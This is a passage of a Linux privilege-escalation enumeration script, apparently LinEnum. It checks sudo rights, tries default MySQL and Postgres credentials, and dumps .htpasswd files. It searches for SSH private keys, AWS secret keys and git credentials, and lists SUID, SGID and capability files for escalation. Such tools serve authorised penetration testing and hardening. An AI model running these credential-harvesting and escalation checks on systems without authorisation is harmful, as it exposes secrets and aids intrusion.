superman=`grep -v -E "^#" /etc/passwd 2>/dev/null| awk -F: '$3 == 0 { print $1}' 2>/dev/null`
if [ "$superman" ]; then
  echo -e "\e[00;31m[-] Super user account(s):\e[00m\n$superman"
  echo -e "\n"
fi

#pull out vital sudoers info
sudoers=`grep -v -e '^$' /etc/sudoers 2>/dev/null |grep -v "#" 2>/dev/null`
if [ "$sudoers" ]; then
  echo -e "\e[00;31m[-] Sudoers configuration (condensed):\e[00m$sudoers"
  echo -e "\n"
fi

if [ "$export" ] && [ "$sudoers" ]; then
  mkdir $format/etc-export/ 2>/dev/null
  cp /etc/sudoers $format/etc-export/sudoers 2>/dev/null
fi

#can we sudo without supplying a password
sudoperms=`echo '' | sudo -S -l -k 2>/dev/null`
if [ "$sudoperms" ]; then
  echo -e "\e[00;33m[+] We can sudo without supplying a password!\e[00m\n$sudoperms" 
  echo -e "\n"
fi

#check sudo perms - authenticated
if [ "$sudopass" ]; then
    if [ "$sudoperms" ]; then
      :
    else
      sudoauth=`echo $userpassword | sudo -S -l -k 2>/dev/null`
      if [ "$sudoauth" ]; then
        echo -e "\e[00;33m[+] We can sudo when supplying a password!\e[00m\n$sudoauth" 
        echo -e "\n"
      fi
    fi
fi

##known 'good' breakout binaries (cleaned to parse /etc/sudoers for comma separated values) - authenticated
if [ "$sudopass" ]; then
    if [ "$sudoperms" ]; then
      :
    else
      sudopermscheck=`echo $userpassword | sudo -S -l -k 2>/dev/null | xargs -n 1 2>/dev/null|sed 's/,*$//g' 2>/dev/null | grep -w $binarylist 2>/dev/null`
      if [ "$sudopermscheck" ]; then
        echo -e "\e[00;33m[-] Possible sudo pwnage!\e[00m\n$sudopermscheck" 
        echo -e "\n"
      fi
    fi
fi

#known 'good' breakout binaries (cleaned to parse /etc/sudoers for comma separated values)
sudopwnage=`echo '' | sudo -S -l -k 2>/dev/null | xargs -n 1 2>/dev/null | sed 's/,*$//g' 2>/dev/null | grep -w $binarylist 2>/dev/null`
if [ "$sudopwnage" ]; then
  echo -e "\e[00;33m[+] Possible sudo pwnage!\e[00m\n$sudopwnage" 
  echo -e "\n"
fi

#who has sudoed in the past
whohasbeensudo=`find /home -name .sudo_as_admin_successful 2>/dev/null`
if [ "$whohasbeensudo" ]; then
  echo -e "\e[00;31m[-] Accounts that have recently used sudo:\e[00m\n$whohasbeensudo" 
  echo -e "\n"
fi

#checks to see if roots home directory is accessible
rthmdir=`ls -ahl /root/ 2>/dev/null`
if [ "$rthmdir" ]; then
  echo -e "\e[00;33m[+] We can read root's home directory!\e[00m\n$rthmdir" 
  echo -e "\n"
fi

#displays /home directory permissions - check if any are lax
homedirperms=`ls -ahl /home/ 2>/dev/null`
if [ "$homedirperms" ]; then
  echo -e "\e[00;31m[-] Are permissions on /home directories lax:\e[00m\n$homedirperms" 
  echo -e "\n"
fi

#looks for files we can write to that don't belong to us
if [ "$thorough" = "1" ]; then
  grfilesall=`find / -writable ! -user \`whoami\` -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null`
  if [ "$grfilesall" ]; then
    echo -e "\e[00;31m[-] Files not owned by user but writable by group:\e[00m\n$grfilesall" 
    echo -e "\n"
  fi
fi

#looks for files that belong to us
if [ "$thorough" = "1" ]; then
  ourfilesall=`find / -user \`whoami\` -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null`
  if [ "$ourfilesall" ]; then
    echo -e "\e[00;31m[-] Files owned by our user:\e[00m\n$ourfilesall"
    echo -e "\n"
  fi
fi

#looks for hidden files
if [ "$thorough" = "1" ]; then
  hiddenfiles=`find / -name ".*" -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null`
  if [ "$hiddenfiles" ]; then
    echo -e "\e[00;31m[-] Hidden files:\e[00m\n$hiddenfiles"
    echo -e "\n"
  fi
fi

#looks for world-reabable files within /home - depending on number of /home dirs & files, this can take some time so is only 'activated' with thorough scanning switch
if [ "$thorough" = "1" ]; then
wrfileshm=`find /home/ -perm -4 -type f -exec ls -al {} \; 2>/dev/null`
	if [ "$wrfileshm" ]; then
		echo -e "\e[00;31m[-] World-readable files within /home:\e[00m\n$wrfileshm" 
		echo -e "\n"
	fi
fi

if [ "$thorough" = "1" ]; then
	if [ "$export" ] && [ "$wrfileshm" ]; then
		mkdir $format/wr-files/ 2>/dev/null
		for i in $wrfileshm; do cp --parents $i $format/wr-files/ ; done 2>/dev/null
	fi
fi

#lists current user's home directory contents
if [ "$thorough" = "1" ]; then
homedircontents=`ls -ahl ~ 2>/dev/null`
	if [ "$homedircontents" ] ; then
		echo -e "\e[00;31m[-] Home directory contents:\e[00m\n$homedircontents" 
		echo -e "\n" 
	fi
fi

#checks for if various ssh files are accessible - this can take some time so is only 'activated' with thorough scanning switch
if [ "$thorough" = "1" ]; then
sshfiles=`find / \( -name "id_dsa*" -o -name "id_rsa*" -o -name "known_hosts" -o -name "authorized_hosts" -o -name "authorized_keys" \) -exec ls -la {} 2>/dev/null \;`
	if [ "$sshfiles" ]; then
		echo -e "\e[00;31m[-] SSH keys/host information found in the following locations:\e[00m\n$sshfiles" 
		echo -e "\n"
	fi
fi

if [ "$thorough" = "1" ]; then
	if [ "$export" ] && [ "$sshfiles" ]; then
		mkdir $format/ssh-files/ 2>/dev/null
		for i in $sshfiles; do cp --parents $i $format/ssh-files/; done 2>/dev/null
	fi
fi

#is root permitted to login via ssh
sshrootlogin=`grep "PermitRootLogin " /etc/ssh/sshd_config 2>/dev/null | grep -v "#" | awk '{print  $2}'`
if [ "$sshrootlogin" = "yes" ]; then
  echo -e "\e[00;31m[-] Root is allowed to login via SSH:\e[00m" ; grep "PermitRootLogin " /etc/ssh/sshd_config 2>/dev/null | grep -v "#" 
  echo -e "\n"
fi
}

environmental_info()
{
echo -e "\e[00;33m### ENVIRONMENTAL #######################################\e[00m" 

#env information
envinfo=`env 2>/dev/null | grep -v 'LS_COLORS' 2>/dev/null`
if [ "$envinfo" ]; then
  echo -e "\e[00;31m[-] Environment information:\e[00m\n$envinfo" 
  echo -e "\n"
fi

#check if selinux is enabled
sestatus=`sestatus 2>/dev/null`
if [ "$sestatus" ]; then
  echo -e "\e[00;31m[-] SELinux seems to be present:\e[00m\n$sestatus"
  echo -e "\n"
fi

#phackt

#current path configuration
pathinfo=`echo $PATH 2>/dev/null`
if [ "$pathinfo" ]; then
  pathswriteable=`ls -ld $(echo $PATH | tr ":" " ")`
  echo -e "\e[00;31m[-] Path information:\e[00m\n$pathinfo" 
  echo -e "$pathswriteable"
  echo -e "\n"
fi

#lists available shells
shellinfo=`cat /etc/shells 2>/dev/null`
if [ "$shellinfo" ]; then
  echo -e "\e[00;31m[-] Available shells:\e[00m\n$shellinfo" 
  echo -e "\n"
fi

#current umask value with both octal and symbolic output
umaskvalue=`umask -S 2>/dev/null & umask 2>/dev/null`
if [ "$umaskvalue" ]; then
  echo -e "\e[00;31m[-] Current umask value:\e[00m\n$umaskvalue" 
  echo -e "\n"
fi

#umask value as in /etc/login.defs
umaskdef=`grep -i "^UMASK" /etc/login.defs 2>/dev/null`
if [ "$umaskdef" ]; then
  echo -e "\e[00;31m[-] umask value as specified in /etc/login.defs:\e[00m\n$umaskdef" 
  echo -e "\n"
fi

#password policy information as stored in /etc/login.defs
logindefs=`grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs 2>/dev/null`
if [ "$logindefs" ]; then
  echo -e "\e[00;31m[-] Password and storage information:\e[00m\n$logindefs" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$logindefs" ]; then
  mkdir $format/etc-export/ 2>/dev/null
  cp /etc/login.defs $format/etc-export/login.defs 2>/dev/null
fi
}

job_info()
{
echo -e "\e[00;33m### JOBS/TASKS ##########################################\e[00m" 

#are there any cron jobs configured
cronjobs=`ls -la /etc/cron* 2>/dev/null`
if [ "$cronjobs" ]; then
  echo -e "\e[00;31m[-] Cron jobs:\e[00m\n$cronjobs" 
  echo -e "\n"
fi

#can we manipulate these jobs in any way
cronjobwwperms=`find /etc/cron* -perm -0002 -type f -exec ls -la {} \; -exec cat {} 2>/dev/null \;`
if [ "$cronjobwwperms" ]; then
  echo -e "\e[00;33m[+] World-writable cron jobs and file contents:\e[00m\n$cronjobwwperms" 
  echo -e "\n"
fi

#contab contents
crontabvalue=`cat /etc/crontab 2>/dev/null`
if [ "$crontabvalue" ]; then
  echo -e "\e[00;31m[-] Crontab contents:\e[00m\n$crontabvalue" 
  echo -e "\n"
fi

crontabvar=`ls -la /var/spool/cron/crontabs 2>/dev/null`
if [ "$crontabvar" ]; then
  echo -e "\e[00;31m[-] Anything interesting in /var/spool/cron/crontabs:\e[00m\n$crontabvar" 
  echo -e "\n"
fi

anacronjobs=`ls -la /etc/anacrontab 2>/dev/null; cat /etc/anacrontab 2>/dev/null`
if [ "$anacronjobs" ]; then
  echo -e "\e[00;31m[-] Anacron jobs and associated file permissions:\e[00m\n$anacronjobs" 
  echo -e "\n"
fi

anacrontab=`ls -la /var/spool/anacron 2>/dev/null`
if [ "$anacrontab" ]; then
  echo -e "\e[00;31m[-] When were jobs last executed (/var/spool/anacron contents):\e[00m\n$anacrontab" 
  echo -e "\n"
fi

#pull out account names from /etc/passwd and see if any users have associated cronjobs (priv command)
cronother=`cut -d ":" -f 1 /etc/passwd | xargs -n1 crontab -l -u 2>/dev/null`
if [ "$cronother" ]; then
  echo -e "\e[00;31m[-] Jobs held by all users:\e[00m\n$cronother" 
  echo -e "\n"
fi

# list systemd timers
if [ "$thorough" = "1" ]; then
  # include inactive timers in thorough mode
  systemdtimers="$(systemctl list-timers --all 2>/dev/null)"
  info=""
else
  systemdtimers="$(systemctl list-timers 2>/dev/null |head -n -1 2>/dev/null)"
  # replace the info in the output with a hint towards thorough mode
  info="\e[2mEnable thorough tests to see inactive timers\e[00m"
fi
if [ "$systemdtimers" ]; then
  echo -e "\e[00;31m[-] Systemd timers:\e[00m\n$systemdtimers\n$info"
  echo -e "\n"
fi

}

networking_info()
{
echo -e "\e[00;33m### NETWORKING  ##########################################\e[00m" 

#nic information
nicinfo=`/sbin/ifconfig -a 2>/dev/null`
if [ "$nicinfo" ]; then
  echo -e "\e[00;31m[-] Network and IP info:\e[00m\n$nicinfo" 
  echo -e "\n"
fi

#nic information (using ip)
nicinfoip=`/sbin/ip a 2>/dev/null`
if [ ! "$nicinfo" ] && [ "$nicinfoip" ]; then
  echo -e "\e[00;31m[-] Network and IP info:\e[00m\n$nicinfoip" 
  echo -e "\n"
fi

arpinfo=`arp -a 2>/dev/null`
if [ "$arpinfo" ]; then
  echo -e "\e[00;31m[-] ARP history:\e[00m\n$arpinfo" 
  echo -e "\n"
fi

arpinfoip=`ip n 2>/dev/null`
if [ ! "$arpinfo" ] && [ "$arpinfoip" ]; then
  echo -e "\e[00;31m[-] ARP history:\e[00m\n$arpinfoip" 
  echo -e "\n"
fi

#dns settings
nsinfo=`grep "nameserver" /etc/resolv.conf 2>/dev/null`
if [ "$nsinfo" ]; then
  echo -e "\e[00;31m[-] Nameserver(s):\e[00m\n$nsinfo" 
  echo -e "\n"
fi

nsinfosysd=`systemd-resolve --status 2>/dev/null`
if [ "$nsinfosysd" ]; then
  echo -e "\e[00;31m[-] Nameserver(s):\e[00m\n$nsinfosysd" 
  echo -e "\n"
fi

#default route configuration
defroute=`route 2>/dev/null | grep default`
if [ "$defroute" ]; then
  echo -e "\e[00;31m[-] Default route:\e[00m\n$defroute" 
  echo -e "\n"
fi

#default route configuration
defrouteip=`ip r 2>/dev/null | grep default`
if [ ! "$defroute" ] && [ "$defrouteip" ]; then
  echo -e "\e[00;31m[-] Default route:\e[00m\n$defrouteip" 
  echo -e "\n"
fi

#listening TCP
tcpservs=`netstat -ntpl 2>/dev/null`
if [ "$tcpservs" ]; then
  echo -e "\e[00;31m[-] Listening TCP:\e[00m\n$tcpservs" 
  echo -e "\n"
fi

tcpservsip=`ss -t -l -n 2>/dev/null`
if [ ! "$tcpservs" ] && [ "$tcpservsip" ]; then
  echo -e "\e[00;31m[-] Listening TCP:\e[00m\n$tcpservsip" 
  echo -e "\n"
fi

#listening UDP
udpservs=`netstat -nupl 2>/dev/null`
if [ "$udpservs" ]; then
  echo -e "\e[00;31m[-] Listening UDP:\e[00m\n$udpservs" 
  echo -e "\n"
fi

udpservsip=`ss -u -l -n 2>/dev/null`
if [ ! "$udpservs" ] && [ "$udpservsip" ]; then
  echo -e "\e[00;31m[-] Listening UDP:\e[00m\n$udpservsip" 
  echo -e "\n"
fi
}

services_info()
{
echo -e "\e[00;33m### SERVICES #############################################\e[00m" 

#running processes
psaux=`ps aux 2>/dev/null`
if [ "$psaux" ]; then
  echo -e "\e[00;31m[-] Running processes:\e[00m\n$psaux" 
  echo -e "\n"
fi

#lookup process binary path and permissisons
procperm=`ps aux 2>/dev/null | awk '{print $11}'|xargs -r ls -la 2>/dev/null |awk '!x[$0]++' 2>/dev/null`
if [ "$procperm" ]; then
  echo -e "\e[00;31m[-] Process binaries and associated permissions (from above list):\e[00m\n$procperm" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$procperm" ]; then
procpermbase=`ps aux 2>/dev/null | awk '{print $11}' | xargs -r ls 2>/dev/null | awk '!x[$0]++' 2>/dev/null`
  mkdir $format/ps-export/ 2>/dev/null
  for i in $procpermbase; do cp --parents $i $format/ps-export/; done 2>/dev/null
fi

#anything 'useful' in inetd.conf
inetdread=`cat /etc/inetd.conf 2>/dev/null`
if [ "$inetdread" ]; then
  echo -e "\e[00;31m[-] Contents of /etc/inetd.conf:\e[00m\n$inetdread" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$inetdread" ]; then
  mkdir $format/etc-export/ 2>/dev/null
  cp /etc/inetd.conf $format/etc-export/inetd.conf 2>/dev/null
fi

#very 'rough' command to extract associated binaries from inetd.conf & show permisisons of each
inetdbinperms=`awk '{print $7}' /etc/inetd.conf 2>/dev/null |xargs -r ls -la 2>/dev/null`
if [ "$inetdbinperms" ]; then
  echo -e "\e[00;31m[-] The related inetd binary permissions:\e[00m\n$inetdbinperms" 
  echo -e "\n"
fi

xinetdread=`cat /etc/xinetd.conf 2>/dev/null`
if [ "$xinetdread" ]; then
  echo -e "\e[00;31m[-] Contents of /etc/xinetd.conf:\e[00m\n$xinetdread" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$xinetdread" ]; then
  mkdir $format/etc-export/ 2>/dev/null
  cp /etc/xinetd.conf $format/etc-export/xinetd.conf 2>/dev/null
fi

xinetdincd=`grep "/etc/xinetd.d" /etc/xinetd.conf 2>/dev/null`
if [ "$xinetdincd" ]; then
  echo -e "\e[00;31m[-] /etc/xinetd.d is included in /etc/xinetd.conf - associated binary permissions are listed below:\e[00m"; ls -la /etc/xinetd.d 2>/dev/null 
  echo -e "\n"
fi

#very 'rough' command to extract associated binaries from xinetd.conf & show permisisons of each
xinetdbinperms=`awk '{print $7}' /etc/xinetd.conf 2>/dev/null |xargs -r ls -la 2>/dev/null`
if [ "$xinetdbinperms" ]; then
  echo -e "\e[00;31m[-] The related xinetd binary permissions:\e[00m\n$xinetdbinperms" 
  echo -e "\n"
fi

initdread=`ls -la /etc/init.d 2>/dev/null`
if [ "$initdread" ]; then
  echo -e "\e[00;31m[-] /etc/init.d/ binary permissions:\e[00m\n$initdread" 
  echo -e "\n"
fi

#init.d files NOT belonging to root!
initdperms=`find /etc/init.d/ \! -uid 0 -type f 2>/dev/null |xargs -r ls -la 2>/dev/null`
if [ "$initdperms" ]; then
  echo -e "\e[00;31m[-] /etc/init.d/ files not belonging to root:\e[00m\n$initdperms" 
  echo -e "\n"
fi

rcdread=`ls -la /etc/rc.d/init.d 2>/dev/null`
if [ "$rcdread" ]; then
  echo -e "\e[00;31m[-] /etc/rc.d/init.d binary permissions:\e[00m\n$rcdread" 
  echo -e "\n"
fi

#init.d files NOT belonging to root!
rcdperms=`find /etc/rc.d/init.d \! -uid 0 -type f 2>/dev/null |xargs -r ls -la 2>/dev/null`
if [ "$rcdperms" ]; then
  echo -e "\e[00;31m[-] /etc/rc.d/init.d files not belonging to root:\e[00m\n$rcdperms" 
  echo -e "\n"
fi

usrrcdread=`ls -la /usr/local/etc/rc.d 2>/dev/null`
if [ "$usrrcdread" ]; then
  echo -e "\e[00;31m[-] /usr/local/etc/rc.d binary permissions:\e[00m\n$usrrcdread" 
  echo -e "\n"
fi

#rc.d files NOT belonging to root!
usrrcdperms=`find /usr/local/etc/rc.d \! -uid 0 -type f 2>/dev/null |xargs -r ls -la 2>/dev/null`
if [ "$usrrcdperms" ]; then
  echo -e "\e[00;31m[-] /usr/local/etc/rc.d files not belonging to root:\e[00m\n$usrrcdperms" 
  echo -e "\n"
fi

initread=`ls -la /etc/init/ 2>/dev/null`
if [ "$initread" ]; then
  echo -e "\e[00;31m[-] /etc/init/ config file permissions:\e[00m\n$initread"
  echo -e "\n"
fi

# upstart scripts not belonging to root
initperms=`find /etc/init \! -uid 0 -type f 2>/dev/null |xargs -r ls -la 2>/dev/null`
if [ "$initperms" ]; then
   echo -e "\e[00;31m[-] /etc/init/ config files not belonging to root:\e[00m\n$initperms"
   echo -e "\n"
fi

systemdread=`ls -lthR /lib/systemd/ 2>/dev/null`
if [ "$systemdread" ]; then
  echo -e "\e[00;31m[-] /lib/systemd/* config file permissions:\e[00m\n$systemdread"
  echo -e "\n"
fi

# systemd files not belonging to root
systemdperms=`find /lib/systemd/ \! -uid 0 -type f 2>/dev/null |xargs -r ls -la 2>/dev/null`
if [ "$systemdperms" ]; then
   echo -e "\e[00;33m[+] /lib/systemd/* config files not belonging to root:\e[00m\n$systemdperms"
   echo -e "\n"
fi
}

software_configs()
{
echo -e "\e[00;33m### SOFTWARE #############################################\e[00m" 

#sudo version - check to see if there are any known vulnerabilities with this
sudover=`sudo -V 2>/dev/null| grep "Sudo version" 2>/dev/null`
if [ "$sudover" ]; then
  echo -e "\e[00;31m[-] Sudo version:\e[00m\n$sudover" 
  echo -e "\n"
fi

#mysql details - if installed
mysqlver=`mysql --version 2>/dev/null`
if [ "$mysqlver" ]; then
  echo -e "\e[00;31m[-] MYSQL version:\e[00m\n$mysqlver" 
  echo -e "\n"
fi

#checks to see if root/root will get us a connection
mysqlconnect=`mysqladmin -uroot -proot version 2>/dev/null`
if [ "$mysqlconnect" ]; then
  echo -e "\e[00;33m[+] We can connect to the local MYSQL service with default root/root credentials!\e[00m\n$mysqlconnect" 
  echo -e "\n"
fi

#mysql version details
mysqlconnectnopass=`mysqladmin -uroot version 2>/dev/null`
if [ "$mysqlconnectnopass" ]; then
  echo -e "\e[00;33m[+] We can connect to the local MYSQL service as 'root' and without a password!\e[00m\n$mysqlconnectnopass" 
  echo -e "\n"
fi

#postgres details - if installed
postgver=`psql -V 2>/dev/null`
if [ "$postgver" ]; then
  echo -e "\e[00;31m[-] Postgres version:\e[00m\n$postgver" 
  echo -e "\n"
fi

#checks to see if any postgres password exists and connects to DB 'template0' - following commands are a variant on this
postcon1=`psql -U postgres -w template0 -c 'select version()' 2>/dev/null | grep version`
if [ "$postcon1" ]; then
  echo -e "\e[00;33m[+] We can connect to Postgres DB 'template0' as user 'postgres' with no password!:\e[00m\n$postcon1" 
  echo -e "\n"
fi

postcon11=`psql -U postgres -w template1 -c 'select version()' 2>/dev/null | grep version`
if [ "$postcon11" ]; then
  echo -e "\e[00;33m[+] We can connect to Postgres DB 'template1' as user 'postgres' with no password!:\e[00m\n$postcon11" 
  echo -e "\n"
fi

postcon2=`psql -U pgsql -w template0 -c 'select version()' 2>/dev/null | grep version`
if [ "$postcon2" ]; then
  echo -e "\e[00;33m[+] We can connect to Postgres DB 'template0' as user 'psql' with no password!:\e[00m\n$postcon2" 
  echo -e "\n"
fi

postcon22=`psql -U pgsql -w template1 -c 'select version()' 2>/dev/null | grep version`
if [ "$postcon22" ]; then
  echo -e "\e[00;33m[+] We can connect to Postgres DB 'template1' as user 'psql' with no password!:\e[00m\n$postcon22" 
  echo -e "\n"
fi

#apache details - if installed
apachever=`apache2 -v 2>/dev/null; httpd -v 2>/dev/null`
if [ "$apachever" ]; then
  echo -e "\e[00;31m[-] Apache version:\e[00m\n$apachever" 
  echo -e "\n"
fi

#what account is apache running under
apacheusr=`grep -i 'user\|group' /etc/apache2/envvars 2>/dev/null |awk '{sub(/.*\export /,"")}1' 2>/dev/null`
if [ "$apacheusr" ]; then
  echo -e "\e[00;31m[-] Apache user configuration:\e[00m\n$apacheusr" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$apacheusr" ]; then
  mkdir --parents $format/etc-export/apache2/ 2>/dev/null
  cp /etc/apache2/envvars $format/etc-export/apache2/envvars 2>/dev/null
fi

#installed apache modules
apachemodules=`apache2ctl -M 2>/dev/null; httpd -M 2>/dev/null`
if [ "$apachemodules" ]; then
  echo -e "\e[00;31m[-] Installed Apache modules:\e[00m\n$apachemodules" 
  echo -e "\n"
fi

#htpasswd check
htpasswd=`find / -name .htpasswd -print -exec cat {} \; 2>/dev/null`
if [ "$htpasswd" ]; then
    echo -e "\e[00;33m[-] htpasswd found - could contain passwords:\e[00m\n$htpasswd"
    echo -e "\n"
fi

#anything in the default http home dirs (a thorough only check as output can be large)
if [ "$thorough" = "1" ]; then
  apachehomedirs=`ls -alhR /var/www/ 2>/dev/null; ls -alhR /srv/www/htdocs/ 2>/dev/null; ls -alhR /usr/local/www/apache2/data/ 2>/dev/null; ls -alhR /opt/lampp/htdocs/ 2>/dev/null`
  if [ "$apachehomedirs" ]; then
    echo -e "\e[00;31m[-] www home dir contents:\e[00m\n$apachehomedirs" 
    echo -e "\n"
  fi
fi

}

interesting_files()
{
echo -e "\e[00;33m### INTERESTING FILES ####################################\e[00m" 

#checks to see if various files are installed
echo -e "\e[00;31m[-] Useful file locations:\e[00m" ; which nc 2>/dev/null ; which netcat 2>/dev/null ; which wget 2>/dev/null ; which nmap 2>/dev/null ; which gcc 2>/dev/null; which curl 2>/dev/null 
echo -e "\n" 

#limited search for installed compilers
compiler=`dpkg --list 2>/dev/null| grep compiler |grep -v decompiler 2>/dev/null && yum list installed 'gcc*' 2>/dev/null| grep gcc 2>/dev/null`
if [ "$compiler" ]; then
  echo -e "\e[00;31m[-] Installed compilers:\e[00m\n$compiler" 
  echo -e "\n"
fi

#manual check - lists out sensitive files, can we read/modify etc.
echo -e "\e[00;31m[-] Can we read/write sensitive files:\e[00m" ; ls -la /etc/passwd 2>/dev/null ; ls -la /etc/group 2>/dev/null ; ls -la /etc/profile 2>/dev/null; ls -la /etc/shadow 2>/dev/null ; ls -la /etc/master.passwd 2>/dev/null 
echo -e "\n" 

#search for suid files
allsuid=`find / -perm -4000 -type f 2>/dev/null`
findsuid=`find $allsuid -perm -4000 -type f -exec ls -la {} 2>/dev/null \;`
if [ "$findsuid" ]; then
  echo -e "\e[00;31m[-] SUID files:\e[00m\n$findsuid" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$findsuid" ]; then
  mkdir $format/suid-files/ 2>/dev/null
  for i in $findsuid; do cp $i $format/suid-files/; done 2>/dev/null
fi

#list of 'interesting' suid files - feel free to make additions
intsuid=`find $allsuid -perm -4000 -type f -exec ls -la {} \; 2>/dev/null | grep -w $binarylist 2>/dev/null`
if [ "$intsuid" ]; then
  echo -e "\e[00;33m[+] Possibly interesting SUID files:\e[00m\n$intsuid" 
  echo -e "\n"
fi

#lists world-writable suid files
wwsuid=`find $allsuid -perm -4002 -type f -exec ls -la {} 2>/dev/null \;`
if [ "$wwsuid" ]; then
  echo -e "\e[00;33m[+] World-writable SUID files:\e[00m\n$wwsuid" 
  echo -e "\n"
fi

#lists world-writable suid files owned by root
wwsuidrt=`find $allsuid -uid 0 -perm -4002 -type f -exec ls -la {} 2>/dev/null \;`
if [ "$wwsuidrt" ]; then
  echo -e "\e[00;33m[+] World-writable SUID files owned by root:\e[00m\n$wwsuidrt" 
  echo -e "\n"
fi

#search for sgid files
allsgid=`find / -perm -2000 -type f 2>/dev/null`
findsgid=`find $allsgid -perm -2000 -type f -exec ls -la {} 2>/dev/null \;`
if [ "$findsgid" ]; then
  echo -e "\e[00;31m[-] SGID files:\e[00m\n$findsgid" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$findsgid" ]; then
  mkdir $format/sgid-files/ 2>/dev/null
  for i in $findsgid; do cp $i $format/sgid-files/; done 2>/dev/null
fi

#list of 'interesting' sgid files
intsgid=`find $allsgid -perm -2000 -type f  -exec ls -la {} \; 2>/dev/null | grep -w $binarylist 2>/dev/null`
if [ "$intsgid" ]; then
  echo -e "\e[00;33m[+] Possibly interesting SGID files:\e[00m\n$intsgid" 
  echo -e "\n"
fi

#lists world-writable sgid files
wwsgid=`find $allsgid -perm -2002 -type f -exec ls -la {} 2>/dev/null \;`
if [ "$wwsgid" ]; then
  echo -e "\e[00;33m[+] World-writable SGID files:\e[00m\n$wwsgid" 
  echo -e "\n"
fi

#lists world-writable sgid files owned by root
wwsgidrt=`find $allsgid -uid 0 -perm -2002 -type f -exec ls -la {} 2>/dev/null \;`
if [ "$wwsgidrt" ]; then
  echo -e "\e[00;33m[+] World-writable SGID files owned by root:\e[00m\n$wwsgidrt" 
  echo -e "\n"
fi

#list all files with POSIX capabilities set along with there capabilities
fileswithcaps=`getcap -r / 2>/dev/null || /sbin/getcap -r / 2>/dev/null`
if [ "$fileswithcaps" ]; then
  echo -e "\e[00;31m[+] Files with POSIX capabilities set:\e[00m\n$fileswithcaps"
  echo -e "\n"
fi

if [ "$export" ] && [ "$fileswithcaps" ]; then
  mkdir $format/files_with_capabilities/ 2>/dev/null
  for i in $fileswithcaps; do cp $i $format/files_with_capabilities/; done 2>/dev/null
fi

#searches /etc/security/capability.conf for users associated capapilies
userswithcaps=`grep -v '^#\|none\|^$' /etc/security/capability.conf 2>/dev/null`
if [ "$userswithcaps" ]; then
  echo -e "\e[00;33m[+] Users with specific POSIX capabilities:\e[00m\n$userswithcaps"
  echo -e "\n"
fi

if [ "$userswithcaps" ] ; then
#matches the capabilities found associated with users with the current user
matchedcaps=`echo -e "$userswithcaps" | grep \`whoami\` | awk '{print $1}' 2>/dev/null`
	if [ "$matchedcaps" ]; then
		echo -e "\e[00;33m[+] Capabilities associated with the current user:\e[00m\n$matchedcaps"
		echo -e "\n"
		#matches the files with capapbilities with capabilities associated with the current user
		matchedfiles=`echo -e "$matchedcaps" | while read -r cap ; do echo -e "$fileswithcaps" | grep "$cap" ; done 2>/dev/null`
		if [ "$matchedfiles" ]; then
			echo -e "\e[00;33m[+] Files with the same capabilities associated with the current user (You may want to try abusing those capabilties):\e[00m\n$matchedfiles"
			echo -e "\n"
			#lists the permissions of the files having the same capabilies associated with the current user
			matchedfilesperms=`echo -e "$matchedfiles" | awk '{print $1}' | while read -r f; do ls -la $f ;done 2>/dev/null`
			echo -e "\e[00;33m[+] Permissions of files with the same capabilities associated with the current user:\e[00m\n$matchedfilesperms"
			echo -e "\n"
			if [ "$matchedfilesperms" ]; then
				#checks if any of the files with same capabilities associated with the current user is writable
				writablematchedfiles=`echo -e "$matchedfiles" | awk '{print $1}' | while read -r f; do find $f -writable -exec ls -la {} + ;done 2>/dev/null`
				if [ "$writablematchedfiles" ]; then
					echo -e "\e[00;33m[+] User/Group writable files with the same capabilities associated with the current user:\e[00m\n$writablematchedfiles"
					echo -e "\n"
				fi
			fi
		fi
	fi
fi

#look for private keys - thanks djhohnstein
if [ "$thorough" = "1" ]; then
privatekeyfiles=`grep -rl "PRIVATE KEY-----" /home 2>/dev/null`
	if [ "$privatekeyfiles" ]; then
  		echo -e "\e[00;33m[+] Private SSH keys found!:\e[00m\n$privatekeyfiles"
  		echo -e "\n"
	fi
fi

#look for AWS keys - thanks djhohnstein
if [ "$thorough" = "1" ]; then
awskeyfiles=`grep -rli "aws_secret_access_key" /home 2>/dev/null`
	if [ "$awskeyfiles" ]; then
  		echo -e "\e[00;33m[+] AWS secret keys found!:\e[00m\n$awskeyfiles"
  		echo -e "\n"
	fi
fi

#look for git credential files - thanks djhohnstein
if [ "$thorough" = "1" ]; then
gitcredfiles=`find / -name ".git-credentials" 2>/dev/null`
	if [ "$gitcredfiles" ]; then
  		echo -e "\e[00;33m[+] Git credentials saved on the machine!:\e[00m\n$gitcredfiles"
  		echo -e "\n"
	fi
fi

#list all world-writable files excluding /proc and /sys
if [ "$thorough" = "1" ]; then
wwfiles=`find / ! -path "*/proc/*" ! -path "/sys/*" -perm -2 -type f -exec ls -la {} 2>/dev/null \;`
	if [ "$wwfiles" ]; then
		echo -e "\e[00;31m[-] World-writable files (excluding /proc and /sys):\e[00m\n$wwfiles" 
		echo -e "\n"
	fi
fi

if [ "$thorough" = "1" ]; then
	if [ "$export" ] && [ "$wwfiles" ]; then
		mkdir $format/ww-files/ 2>/dev/null
		for i in $wwfiles; do cp --parents $i $format/ww-files/; done 2>/dev/null
	fi
fi

#are any .plan files accessible in /home (could contain useful information)
usrplan=`find /home -iname *.plan -exec ls -la {} \; -exec cat {} 2>/dev/null \;`
if [ "$usrplan" ]; then
  echo -e "\e[00;31m[-] Plan file permissions and contents:\e[00m\n$usrplan" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$usrplan" ]; then
  mkdir $format/plan_files/ 2>/dev/null
  for i in $usrplan; do cp --parents $i $format/plan_files/; done 2>/dev/null
fi

bsdusrplan=`find /usr/home -iname *.plan -exec ls -la {} \; -exec cat {} 2>/dev/null \;`
if [ "$bsdusrplan" ]; then
  echo -e "\e[00;31m[-] Plan file permissions and contents:\e[00m\n$bsdusrplan" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$bsdusrplan" ]; then
